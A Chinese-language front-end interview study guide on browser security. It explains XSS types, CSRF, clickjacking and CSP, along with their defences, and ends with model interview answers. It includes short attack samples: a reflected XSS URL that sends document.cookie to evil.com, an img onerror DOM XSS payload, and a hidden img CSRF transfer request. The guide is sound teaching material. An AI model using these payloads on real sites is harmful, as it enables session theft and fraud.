# 浏览器安全

## 为什么前端需要关注安全？

前端代码直接在用户浏览器中运行，浏览器又是"内容展示 + 用户交互 + 网络请求"的集合体。攻击者可以：
- 在页面中注入恶意脚本
- 诱骗用户的浏览器发起非预期请求
- 通过网络劫持窃取数据

前端安全的三大核心话题：**XSS**、**CSRF**、**点击劫持**，另加 **CSP**（内容安全策略）和 **HTTPS**。

---

## 一、XSS（跨站脚本攻击）

### 是什么？

**XSS（Cross-Site Scripting）**：攻击者将**恶意 JavaScript 脚本**注入到网页中，使其在受害者的浏览器里执行。

一旦脚本执行，攻击者可以：
- 读取 `document.cookie`，窃取用户 Session/Token
- 修改页面内容，钓鱼欺诈
- 以用户身份发送请求（结合 CSRF）
- 键盘记录、截屏

### XSS 的三种类型

#### 1. 存储型 XSS（持久化，危害最大）

攻击脚本被**存储在服务器数据库**中，所有访问该页面的用户都会受害。

```
攻击者 → 在评论框里输入恶意脚本 → 服务器存入数据库
                                           │
其他用户访问页面 → 服务器返回含脚本的 HTML → 浏览器执行脚本 → 被攻击
```

例子：论坛评论、用户名字段、商品描述等，如果服务端不对内容做转义，直接存入数据库再输出到 HTML，就会被利用。

#### 2. 反射型 XSS（非持久化）

恶意脚本**包含在 URL 参数**中，服务端直接把参数内容反射到响应 HTML，不存数据库。

```
攻击者构造 URL:
http://example.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>

受害者点击此链接 → 服务端把 q 参数内容直接输出到 HTML：
<p>您搜索了：<script>document.location=...</script></p>

浏览器执行脚本 → Cookie 被发送到 evil.com
```

通常需要通过钓鱼邮件、短链接等方式诱骗用户点击恶意 URL。

#### 3. DOM 型 XSS

漏洞完全在**前端 JavaScript** 中，服务端没有参与。JS 从 URL 或其他不可信来源读取数据，并直接写入 DOM。

```javascript
// 危险：直接把 URL 参数写入 innerHTML
const name = location.hash.slice(1)  // 取 URL 中 # 后面的内容
document.querySelector('#greeting').innerHTML = '你好，' + name
// 访问 http://example.com#<img src=x onerror=alert(1)>
// onerror 回调被执行
```

### 防御 XSS

#### 1. 对输出进行 HTML 转义（最基础）

在**把内容输出到 HTML 之前**，把特殊字符转义：

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
/  →  &#x2F;
```

React、Vue 等现代框架默认对内容转义（使用 `{{ }}` 或 JSX 文本节点时），这也是为什么在这些框架里 XSS 风险更低。

**危险操作**（绕过框架转义，直接注入原始 HTML）：
```javascript
// React - 危险
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Vue - 危险
<div v-html="userInput" />
```

只在确认内容可信（如经过服务端处理的富文本）时才使用，且要配合 DOMPurify 等白名单过滤库。

#### 2. Cookie 设置 HttpOnly

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JS 无法通过 `document.cookie` 读取该 Cookie，即使注入了脚本也偷不到 Session。
- `Secure`：Cookie 只在 HTTPS 连接下发送。
- `SameSite`：防 CSRF（见下文）。

#### 3. 内容安全策略（CSP）

通过 HTTP 响应头限制页面可以加载哪些来源的资源：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

含义：只允许加载同源和 `trusted.cdn.com` 的脚本，其他所有来源的脚本（包括内联 `<script>`）都被禁止执行。即使攻击者注入了脚本标签，浏览器也不会执行。

#### 4. 输入验证

在前端和后端都对用户输入进行验证，拒绝不合法的内容（但不能单靠这个，因为输入验证可以被绕过）。

---

## 二、CSRF（跨站请求伪造）

### 是什么？

**CSRF（Cross-Site Request Forgery）**：攻击者**诱骗已登录的用户**，在不知情的情况下，向目标网站发送攻击者想要的请求。

```
① 用户登录了 bank.com，浏览器存有 bank.com 的 Session Cookie

② 用户在同一浏览器打开了 evil.com

③ evil.com 页面里有一段隐藏代码：
   <img src="http://bank.com/transfer?to=attacker&amount=10000">
   （或者自动提交的表单）

④ 浏览器发起这个请求时，会自动带上 bank.com 的 Cookie

⑤ bank.com 看到请求带有合法的 Cookie，以为是用户操作，执行转账
```

注意：CSRF 攻击者并**不能读取**响应内容（受同源策略限制），他只是"借用"用户的身份发请求。

### CSRF vs XSS 的区别

| 对比 | XSS | CSRF |
| --- | --- | --- |
| 目的 | 在目标网站执行恶意脚本 | 冒充用户发请求 |
| 攻击载体 | 注入到目标网站的脚本 | 第三方网站的隐藏请求 |
| 是否需要用户已登录 | 不一定 | 必须 |
| 是否能读取响应 | 能（脚本在目标网站执行）| 不能 |

### 防御 CSRF

#### 1. SameSite Cookie（现代主流方案）

```http
Set-Cookie: session=abc123; SameSite=Strict
```

- `SameSite=Strict`：**完全禁止**跨站携带 Cookie，第三方网站发来的请求不会带 Cookie。
- `SameSite=Lax`（现代浏览器默认值）：大多数跨站请求不带 Cookie，但顶级导航（点击链接跳转）的 GET 请求允许。
- `SameSite=None`：允许跨站携带 Cookie（需同时设置 `Secure`，仅用于特殊场景如第三方登录）。

#### 2. CSRF Token

服务端生成一个随机 Token，嵌入到表单或响应中，每次请求都要带上这个 Token，服务端验证：

```html
<!-- 服务端在表单里嵌入 CSRF Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机生成的Token">
  <input type="text" name="amount">
  <button>转账</button>
</form>
```

攻击者不知道这个 Token（受同源策略保护，无法从第三方网站读取），所以伪造的请求会缺少 Token，被服务端拒绝。

AJAX 请求通常把 Token 放在自定义请求头里：

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')
  },
  body: JSON.stringify({ amount: 100 })
})
```

#### 3. 验证 `Referer` / `Origin` 头

服务端检查请求头中的 `Referer` 或 `Origin`，只接受来自可信域名的请求：

```
# 合法请求来自 bank.com 本身
Origin: https://bank.com   → 允许

# 攻击请求来自 evil.com
Origin: https://evil.com   → 拒绝
```

缺点：`Referer` 可能被用户设置为不发送（隐私保护），且某些请求不包含 `Referer`，不能作为唯一防御手段。

---

## 三、点击劫持（Clickjacking）

### 是什么？

攻击者将目标网站嵌入到一个**透明的 iframe** 中，覆盖在诱导性内容之上，让用户以为自己在点击正常按钮，实际上点击的是目标网站的操作按钮。

```
用户看到的：   攻击者的诱导按钮（"点击领取奖励"）
实际上有：     透明的 bank.com iframe 的"确认转账"按钮，叠在按钮上方
```

### 防御

#### X-Frame-Options 响应头

```http
# 完全禁止被嵌入 iframe
X-Frame-Options: DENY

# 只允许同源页面嵌入
X-Frame-Options: SAMEORIGIN
```

#### CSP frame-ancestors（更灵活，推荐）

```http
# 禁止任何来源嵌入
Content-Security-Policy: frame-ancestors 'none'

# 只允许同源嵌入
Content-Security-Policy: frame-ancestors 'self'

# 允许特定域名嵌入
Content-Security-Policy: frame-ancestors https://trusted.com
```

---

## 四、内容安全策略（CSP）

CSP 是一个强大的"白名单"机制，通过 HTTP 头告诉浏览器：**页面只能加载/执行来自指定来源的资源**。

```http
Content-Security-Policy:
  default-src 'self';                        # 默认只允许同源
  script-src 'self' https://cdn.example.com; # 脚本只允许同源和此 CDN
  style-src 'self' 'unsafe-inline';          # 样式允许内联（非推荐）
  img-src *;                                 # 图片允许任意来源
  connect-src 'self' https://api.example.com;# XHR/fetch 只允许这两个来源
  frame-ancestors 'none';                    # 禁止被嵌入 iframe
```

CSP 同时防御 XSS 和点击劫持，是现代 Web 应用的重要防线。

---

## 面试官怎么问

### Q1: 什么是 XSS？如何防御？

**参考回答：**

XSS（跨站脚本攻击）是攻击者向网页注入恶意 JS 脚本，在用户浏览器中执行，窃取 Cookie/Token 或进行其他恶意操作。分为三类：
- **存储型**：脚本存到数据库，危害所有访问用户（最严重）
- **反射型**：脚本在 URL 中，服务端反射输出，需要诱骗用户点击
- **DOM 型**：纯前端漏洞，JS 直接把不可信数据写入 DOM

防御手段：
1. **输出转义**：把 HTML 特殊字符（`<>"`等）转义，React/Vue 默认做了这一步
2. **HttpOnly Cookie**：防止脚本读取 Cookie
3. **CSP**：限制脚本执行来源，即使注入了也无法执行
4. **避免 `innerHTML` / `v-html` / `dangerouslySetInnerHTML`** 直接注入用户输入

### Q2: 什么是 CSRF？如何防御？

**参考回答：**

CSRF（跨站请求伪造）是攻击者诱骗已登录用户，在不知情的情况下向目标网站发送恶意请求（如转账、修改密码）。浏览器会自动携带 Cookie，服务端以为是合法用户操作。

防御手段：
1. **SameSite Cookie**：设置 `SameSite=Strict/Lax`，阻止跨站请求携带 Cookie（现代浏览器已默认 Lax）
2. **CSRF Token**：每次请求携带服务端下发的随机 Token，攻击者无法伪造
3. **验证 Origin/Referer**：服务端检查请求来源

### Q3: XSS 和 CSRF 有什么区别？

**参考回答：**

| | XSS | CSRF |
| --- | --- | --- |
| 原理 | 注入脚本，**在目标网站执行** | **借用**用户身份，发送请求 |
| 攻击者需要 | 找到网站的注入漏洞 | 一个第三方页面，诱骗用户访问 |
| 危害 | 直接控制浏览器中的目标网站 | 以用户身份执行操作 |
| 关键防御 | 输出转义 + CSP | SameSite Cookie + CSRF Token |

简单记忆：XSS 是"把坏东西注入进去"，CSRF 是"冒充用户做坏事"。

### Q4: 如果 Cookie 设置了 HttpOnly，XSS 攻击还有危害吗？

**参考回答：**

有，HttpOnly 只是让脚本无法**读取** Cookie，但攻击者通过 XSS 还能做很多事：
- 发起请求（如果没有 CSRF Token 防护，相当于 CSRF 攻击）
- 修改页面内容（钓鱼）
- 键盘记录
- 获取 LocalStorage 中的 Token（LocalStorage 没有 HttpOnly）
- 截图、采集数据发送到攻击者服务器

所以 HttpOnly 只是纵深防御的一层，XSS 的根本防御还是**阻止脚本注入**（输出转义 + CSP）。
